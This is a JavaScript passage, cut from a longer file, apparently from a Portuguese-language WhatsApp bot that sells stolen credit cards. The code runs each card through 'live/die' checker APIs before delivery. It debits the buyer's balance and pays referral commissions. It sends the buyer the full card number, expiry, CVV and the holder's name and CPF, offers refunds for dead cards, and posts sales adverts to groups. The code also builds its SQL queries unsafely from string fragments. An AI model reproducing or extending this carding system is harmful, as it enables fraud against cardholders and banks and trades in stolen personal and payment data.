        if (API_CHK_2_COMPLETA.indexOf("&numero=") > -1){
            API_CHK_2_COMPLETA = API_CHK_2_COMPLETA.replace(/infocc/igm, `${NUMERO_CC_CHK}&mes=${MES_CC_CHK}&ano=20${ANO_CC_CHK}&csc=${CVV_CC_CHK}`);
        }else{
            API_CHK_2_COMPLETA = API_CHK_2_COMPLETA.replace(/infocc/igm, CC_CHK);
        }
        
        //USO_APIS_CHK
        //0 = AO COMPRAR UMA CC, NÃO VAI CHECAR E SIM ENTREGA-LA DIRETO.
        //1 = AO COMPRAR UMA CC, APENAS A API PRIMÁRIA VAI CHECAR!
        //2 = AO COMPRAR UMA CC, APENAS A API SECUNDÁRIA VAI CHECAR!
        //3 = AO COMPRAR UMA CC, PRIMEIRO VAI CHECAR COM A API PRIMÁRIA E CASO DER DIE, VAI CHECAR COM A API SECUNDÁRIA.

        QUAL_API = ""
        PRIMEIRA_OU_SEGUNDA_VEZ = "1" //Compra CC ou Reembolsar
        if (PROCESSADO_CHK === "1") {
            PRIMEIRA_OU_SEGUNDA_VEZ = "1"
            console.log("Vou checar está CC que o cliente quer comprar pela primeira vez!")
            MANIPULAR_RETORNO_CHK_PARA_TESTES = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANIPULAR_RETORNO_CHK_PARA_TESTES'`).get()["VALOR"]
            if (MANIPULAR_RETORNO_CHK_PARA_TESTES != "0") {
                console.log(`Manipulei o retorno só para testar algo no código, era para ser api primária, PROCESSADO_CHK: ${PROCESSADO_CHK}`)
                URL_CHK_COM_CC = "https://bin-check-dr4g.herokuapp.com/api/550209"
                HEADER = "0"
            } else {
                if (USO_APIS_CHK === "1") {
                    console.log("Checarei com a API primária nesta compra de CC...")
                    QUAL_API = "1"
                    URL_CHK_COM_CC = API_CHK_1_COMPLETA
                    HEADER = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION'`).get()["VALOR"]
                }
                if (USO_APIS_CHK === "2") {
                    console.log("Checarei com a API secundária nesta compra de CC...")
                    QUAL_API = "2"
                    URL_CHK_COM_CC = API_CHK_2_COMPLETA
                    HEADER = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION_SECUNDARIO'`).get()["VALOR"]
                }
                if (USO_APIS_CHK === "3") {
                    console.log("Checarei com a API primária e ser der Die, vou checar com a secundária...")
                    QUAL_API = "1"
                    URL_CHK_COM_CC = API_CHK_1_COMPLETA
                    HEADER = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION'`).get()["VALOR"]
                }
            }
        }

        if (PROCESSADO_CHK === "3") {
            PRIMEIRA_OU_SEGUNDA_VEZ = "2"
            console.log("Vou checar pela segunda vez por ter dado die na primeira checagem ao comprar.")
            MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO'`).get()["VALOR"]
            if (MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO != "0") {
                console.log(`Manipulei o retorno só para testar algo no código, era para ser api secundária, PROCESSADO_CHK: ${PROCESSADO_CHK}`)
                URL_CHK_COM_CC = "https://bin-check-dr4g.herokuapp.com/api/550209"
                HEADER = "0"
            } else {
                if (USO_APIS_CHK === "3") {
                    console.log("Checarei com a API secundária...")
                    QUAL_API = "2"
                    URL_CHK_COM_CC = API_CHK_2_COMPLETA
                    HEADER = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION_SECUNDARIO'`).get()["VALOR"]
                }
            }
        }
        if (PROCESSADO_CHK === "13") {
            PRIMEIRA_OU_SEGUNDA_VEZ = "2"
            console.log("Vou checar pela segunda vez por die no reembolso.")
            MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO'`).get()["VALOR"]
            if (MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO != "0") {
                console.log(`Manipulei o retorno só para testar algo no código, era para ser api secundária, PROCESSADO_CHK: ${PROCESSADO_CHK}`)
                URL_CHK_COM_CC = "https://bin-check-dr4g.herokuapp.com/api/550209"
                HEADER = "0"
            } else {
                if (USO_APIS_CHK === "3") {
                    console.log("Checarei com a API secundária...")
                    QUAL_API = "2"
                    URL_CHK_COM_CC = API_CHK_2_COMPLETA
                    HEADER = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION_SECUNDARIO'`).get()["VALOR"]
                }
            }
        }

        if (PROCESSADO_CHK === "7") {
            PRIMEIRA_OU_SEGUNDA_VEZ = "1"
            CHK_REEMBOLSO_COMO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_REEMBOLSO_COMO'`).get()["VALOR"]
            if (CHK_REEMBOLSO_COMO === "1" || CHK_REEMBOLSO_COMO === "3") {
                console.log("Solicitou reembolso, Vou checar com a API primária")
                QUAL_API = "1"
                MANIPULAR_RETORNO_CHK_PARA_TESTES = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANIPULAR_RETORNO_CHK_PARA_TESTES'`).get()["VALOR"]
                if (MANIPULAR_RETORNO_CHK_PARA_TESTES != "0") {
                    console.log(`Manipulei o retorno só para testar algo no código, era para ser api primária, PROCESSADO_CHK: ${PROCESSADO_CHK}`)
                    URL_CHK_COM_CC = "https://bin-check-dr4g.herokuapp.com/api/550209"
                    HEADER = "0"
                } else {
                    console.log("Checarei com a API primária...")
                    QUAL_API = "1"
                    URL_CHK_COM_CC = API_CHK_1_COMPLETA
                    HEADER = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION'`).get()["VALOR"]
                }
            } else {
                console.log("Solicitou reembolso, Vou checar com a API secundária")
                QUAL_API = "2"
                MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO'`).get()["VALOR"]
                if (MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO != "0") {
                    console.log(`Manipulei o retorno só para testar algo no código, era para ser api secundária, PROCESSADO_CHK: ${PROCESSADO_CHK}`)
                    URL_CHK_COM_CC = "https://bin-check-dr4g.herokuapp.com/api/550209"
                    HEADER = "0"
                } else {
                    console.log("Checarei com a API secundária...")
                    URL_CHK_COM_CC = API_CHK_2_COMPLETA
                    HEADER = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION_SECUNDARIO'`).get()["VALOR"]
                }
            }
        }

        console.log(`URL: ${URL_CHK_COM_CC}`)
        console.log(`HEADER: ${HEADER}`)
        if (HEADER.toString() === "0") {
            var options = {
                'method': 'GET',
                'url': URL_CHK_COM_CC,
                rejectUnauthorized: false,
                'headers': {
                }
            };
        } else {
            var options = {
                'method': 'GET',
                'url': URL_CHK_COM_CC,
                rejectUnauthorized: false,
                'headers': {
                    'Authorization': HEADER,
                }
            };
        }
        Requestando_MS = Date.now()
        Var_Request_ID_CHK = ID_CHK
        Var_Request_CONTATO_CHK = CONTATO_CHK
        Var_Request = request(options, async function (error, response) {
            if (error) {
                console.log(error);
                ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                return
            }
            Requestando_MS = 0
            console.log("REQUEST VEIO E VOU PROCESSAR")

            if (PROCESSADO_CHK === "1" || PROCESSADO_CHK === "3" || PROCESSADO_CHK === "7" || PROCESSADO_CHK === "13") {
                MANIPULAR_RETORNO_CHK_PARA_TESTES = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANIPULAR_RETORNO_CHK_PARA_TESTES'`).get()["VALOR"]
                if (MANIPULAR_RETORNO_CHK_PARA_TESTES != "0") {
                    Retorno_Checker = MANIPULAR_RETORNO_CHK_PARA_TESTES
                } else {
                    Retorno_Checker = response.body
                }
            }
            if (PROCESSADO_CHK === "3" || PROCESSADO_CHK === "8" || PROCESSADO_CHK === "13") {
                MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO'`).get()["VALOR"]
                if (MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO != "0") {
                    Retorno_Checker = MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO
                } else {
                    Retorno_Checker = response.body
                }
            }
            console.log(Retorno_Checker)

            try {

                if (QUAL_API === "1") {
                    PALAVRA_LIVE_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]
                    PALAVRA_LIVE2_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2'`).get()["VALOR"]
                    PALAVRA_LIVE3_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE3'`).get()["VALOR"]
                    PALAVRA_DIE_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]
                    PALAVRA_DIE2_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2'`).get()["VALOR"]
                    PALAVRA_DIE3_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE3'`).get()["VALOR"]
                } else {
                    PALAVRA_LIVE_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).get()["VALOR"]
                    PALAVRA_LIVE2_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2_SECUNDARIO'`).get()["VALOR"]
                    PALAVRA_LIVE3_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE3_SECUNDARIO'`).get()["VALOR"]
                    PALAVRA_DIE_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).get()["VALOR"]
                    PALAVRA_DIE2_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2_SECUNDARIO'`).get()["VALOR"]
                    PALAVRA_DIE3_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE3_SECUNDARIO'`).get()["VALOR"]
                }


                Retorno_Checker_Salvar = Retorno_Checker.replace(/\'/igm, "");
                Dados_Checagem = `URL: ${URL_CHK_COM_CC} | HEADER: ${HEADER} | PALAVRAS LIVE: ${PALAVRA_LIVE_CHK},${PALAVRA_LIVE2_CHK},${PALAVRA_LIVE3_CHK} | PALAVRAS DIE: ${PALAVRA_DIE_CHK},${PALAVRA_DIE2_CHK},${PALAVRA_DIE3_CHK}`
                Dados_Checagem = Dados_Checagem.replace(/\'/igm, "");

                await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET DADOS_CHECAGEM = '${Dados_Checagem}' WHERE _rowid_ = '${ID_CHK}'`).run()
                await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET RESULTADO_CHK = '${Retorno_Checker_Salvar}' WHERE _rowid_ = '${ID_CHK}'`).run()

                if (TIPOCC_CHK.toString() === "1") {
                    Full = ""
                } else {
                    Full = "_FULL"
                }

                if (Retorno_Checker.toString().indexOf(PALAVRA_LIVE_CHK) > -1 || Retorno_Checker.toString().indexOf(PALAVRA_LIVE2_CHK) > -1 || Retorno_Checker.toString().indexOf(PALAVRA_LIVE3_CHK) > -1) {
                    //DEU LIVE
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    if (PROCESSADO_CHK === "1") {
                        console.log("CC colocada para compra foi checada e deu Live!")
                        await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '2' WHERE _rowid_ = '${ID_CHK}'`).run()
                    }
                    if (PROCESSADO_CHK === "3") {
                        console.log("Checou pela segunda vez e agora Deu Live!")
                        await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '5' WHERE _rowid_ = '${ID_CHK}'`).run()
                    }
                    if (PROCESSADO_CHK === "7") {
                        console.log("Checou para reembolsar e Deu Live na primária ou secundária e fim.")
                        await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '8' WHERE _rowid_ = '${ID_CHK}'`).run()
                        Texto = `✅ *CC Aprovada!* ✅

*NÃO SERÁ POSSÍVEL REEMBOLSO, POIS ESTA CC ESTÁ LIVE.*

*CC:* ${CC_CHK}`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                        return
                    }
                    if (PROCESSADO_CHK === "13") {
                        console.log("Checou para reembolsar, tinha dado Die na primária e Deu Live na secundária e fim.")
                        await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '14' WHERE _rowid_ = '${ID_CHK}'`).run()
                    }

                    if (PROCESSADO_CHK === "7" || PROCESSADO_CHK === "13") {

                        NIVEL_CC_CHK = await DataBase_Better.prepare(`SELECT NIVEL FROM CCS_VENDIDAS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["NIVEL"]
                        BANCO_CC_CHK = await DataBase_Better.prepare(`SELECT BANCO FROM CCS_VENDIDAS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["BANCO"]
                        BANDEIRA_CC_CHK = await DataBase_Better.prepare(`SELECT BANDEIRA FROM CCS_VENDIDAS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["BANDEIRA"]
                        TIPO_CC_CHK = await DataBase_Better.prepare(`SELECT TIPO FROM CCS_VENDIDAS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["TIPO"]
                        PAIS_CC_CHK = await DataBase_Better.prepare(`SELECT PAIS FROM CCS_VENDIDAS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["PAIS"]
                        DADOS_CC_CHK = await DataBase_Better.prepare(`SELECT DADOS FROM CCS_VENDIDAS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["DADOS"]
                        if (DADOS_CC_CHK.toString() === "#") {
                            Array_Dados = await Obter_Nome_CPF()
                            DADOS_CC_CHK = `NOME:${Array_Dados[0]["NOME"]}
CPF:${Array_Dados[0]["CPF"]}`
                        }

                    } else {

                        NIVEL_CC_CHK = await DataBase_Better.prepare(`SELECT NIVEL FROM CCS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["NIVEL"]
                        BANCO_CC_CHK = await DataBase_Better.prepare(`SELECT BANCO FROM CCS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["BANCO"]
                        BANDEIRA_CC_CHK = await DataBase_Better.prepare(`SELECT BANDEIRA FROM CCS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["BANDEIRA"]
                        TIPO_CC_CHK = await DataBase_Better.prepare(`SELECT TIPO FROM CCS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["TIPO"]
                        PAIS_CC_CHK = await DataBase_Better.prepare(`SELECT PAIS FROM CCS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["PAIS"]
                        DADOS_CC_CHK = await DataBase_Better.prepare(`SELECT DADOS FROM CCS WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["DADOS"]
                        if (DADOS_CC_CHK.toString() === "#") {
                            Array_Dados = await Obter_Nome_CPF()
                            DADOS_CC_CHK = `NOME:${Array_Dados[0]["NOME"]}
CPF:${Array_Dados[0]["CPF"]}`
                        }

                    }
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${CONTATO_CHK}'`).get()["SALDO"]
                    SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)
                    NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(VALOR_CC_CHK)
                    NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)
                    await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${CONTATO_CHK}'`).run()

                    VALOR_BASE_INDIC = VALOR_CC_CHK
                    Contato_Temp_Indic = CONTATO_CHK
                    FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
                    if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                        ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                        if (ATIVAR_ASSOCIADOS === "1") {

                            Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                            if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                                NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
                                PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                                if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                                    PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                                } else {
                                    PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                                }

                                PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                                if (PIX_OU_COMPRA === "1") {

                                } else if (PIX_OU_COMPRA === "2") {
                                    VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                                    VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                                    console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                                    SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                                    SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                                    console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                                    NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                                    NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                                    console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                                    await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                                    console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
                                }
                            }
                        }
                    }

                    await DataBase_Better.prepare(`INSERT INTO CCs_Vendidas (
NUMERO,
MES,
ANO,
CVV,
BANDEIRA,
TIPO,
NIVEL,
BANCO,
PAIS,
DADOS,
TIPOCC,
Data_MS_Inserido,
VALOR,
NUMERO_COMPRADOR) VALUES (
'${NUMERO_CC_CHK}',
'${MES_CC_CHK}',
'${ANO_CC_CHK}',
'${CVV_CC_CHK}',
'${BANDEIRA_CC_CHK}',
'${TIPO_CC_CHK}',
'${NIVEL_CC_CHK}',
'${BANCO_CC_CHK}',
'${PAIS_CC_CHK}',
'${DADOS_CC_CHK}',
'${TIPOCC_CHK}',
'${Date.now()}',
'${VALOR_CC_CHK}',
'${CONTATO_CHK}')`
                    ).run()
                    await DataBase_Better.prepare(`DELETE FROM CCS WHERE NUMERO == ${NUMERO_CC_CHK}`).run()
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    Texto = `✅ *CC Aprovada!* ✅`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    MENSAGEM_AO_COMPRAR_CC_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CC'`).get()["VALOR"]
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    Texto_Usuario = `💳 *SUCESSO CC COMPRADA* 💳

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
💰 *VALOR CC:* R$: ${VALOR_CC_CHK}

💳 *CARTÃO:* ${NUMERO_CC_CHK}|${MES_CC_CHK}|${ANO_CC_CHK}|${CVV_CC_CHK}
🏳️ *BANDEIRA:* ${BANDEIRA_CC_CHK}
⚜️ *TIPO:* ${TIPO_CC_CHK}
💠 *NIVEL:* ${NIVEL_CC_CHK}
🏛 *BANCO:* ${BANCO_CC_CHK}
🌍 *PAIS:* ${PAIS_CC_CHK}

👤 *DADOS:* ${DADOS_CC_CHK}

═══════❖═══════
${MENSAGEM_AO_COMPRAR_CC_CHK}


*Mandei os dados da CC em uma mensagem separada, para que você copie com mais facilidade.*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_CC_PV}',
'${Date.now()}')`).run()
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    ATIVAR_REEMBOLSO_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_REEMBOLSO_CHK'`).get()["VALOR"]
                    if (ATIVAR_REEMBOLSO_CHK === "1") {
                        console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                        CONSTRUCAO_LISTMESSAGE_buttonText = "REEMBOLSAR"
                        CONSTRUCAO_LISTMESSAGE_title = "REEMBOLSAR"
                        CONSTRUCAO_LISTMESSAGE_description = CC_CHK

                        CONSTRUCAO_LISTMESSAGE_rows = []
                        iD_Footer = Date.now()

                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga|ccs_reembolsar`,
                                title: "🔄 REEMBOLSAR",
                                description: "Checaremos novamente esta CC, se estiver Die, você será reembolsado.",
                            },
                        )

                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                    } else {

                        console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendText',
'${CC_CHK}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }

                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                    NOT_COMPROU_CC_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CC'`).get()["VALOR"]
                    if (NOT_COMPROU_CC_CHK === "1") {

                        Texto_Grupo = `💳 *USUÁRIO COMPROU UMA CC* 💳

👤 *USUÁRIO:* wa.me/${Numero_CHK}

💳 *CARTÃO:* ****************|${MES_CC_CHK}|${ANO_CC_CHK}|***
🏳️ *BANDEIRA:* ${BANDEIRA_CC_CHK}
⚜️ *TIPO:* ${TIPO_CC_CHK}
💠 *NIVEL:* ${NIVEL_CC_CHK}
🏛 *BANCO:* ${BANCO_CC_CHK}
🌍 *PAIS:* ${PAIS_CC_CHK}

────────────────

*VENHA ADQUIRIR AS MELHORES CCs DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`
                        console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
                        ATIVAR_NOTIFICACOES = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'ATIVAR_NOTIFICACOES'`).get()["VALOR"]
                        if (ATIVAR_NOTIFICACOES === "1") {
                            ID_GRUPOS = await DataBase_Better.prepare(`SELECT ID_GRUPO FROM GRUPOS_NOTIFICAR`).all()
                        } else {
                            ID_GRUPOS = []
                        }
